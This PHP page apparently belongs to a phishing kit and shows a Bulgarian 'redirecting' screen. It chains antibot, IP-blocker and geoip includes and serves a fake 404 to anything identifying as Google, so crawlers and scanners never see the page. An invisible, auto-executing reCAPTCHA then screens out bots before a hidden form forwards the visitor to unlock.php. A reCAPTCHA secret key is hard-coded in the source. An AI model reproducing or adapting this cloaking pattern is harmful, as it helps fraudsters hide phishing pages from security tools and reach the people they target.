<?php
include('antibot.php');
include('antibot1.php');
include('antibot2.php');
include('antibot3.php');
include('antibot4.php');
include('antibot5.php');
include('antibot6.php');
include('antiip.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html>
<head>
<title>преадресирам...</title>
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},2000)</script>
<script>
    function onSubmit(token) {
        document.getElementById("i-recaptcha").submit();
    }
</script>
</head>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},2500)</script>
<body>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    function post_captcha($user_response) {
        $fields_string = '';
        $fields = array(
            'secret' => '6Ld7bfQoAAAAAAxeLQoXvGHlaGNtljlWILgUjZ1b',
            'response' => $user_response
        );
        foreach($fields as $key=>$value)
        $fields_string .= $key . '=' . $value . '&';
        $fields_string = rtrim($fields_string, '&');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify');
        curl_setopt($ch, CURLOPT_POST, count($fields));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
        $result = curl_exec($ch);
        curl_close($ch);
        return json_decode($result, true);
    }
    $res = post_captcha($_POST['g-recaptcha-response']);
    if (!$res['success']) {
        echo 'reCAPTCHA error';
    } else {
        echo '<br><p>CAPTCHA was completed successfully!</p><br>';
    }
} else { 
}
?>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},3000)</script>
<form id='i-recaptcha' action="unlock.php" method="post">
<button hidden="hidden" class="g-recaptcha" data-sitekey="6Ld7bfQoAAAAAAR4WfLUz7DXBoRCTXadBkqyMASW" data-callback="onSubmit">
</button>
</form>
преадресирам...
</body>
</html>
<?php
?>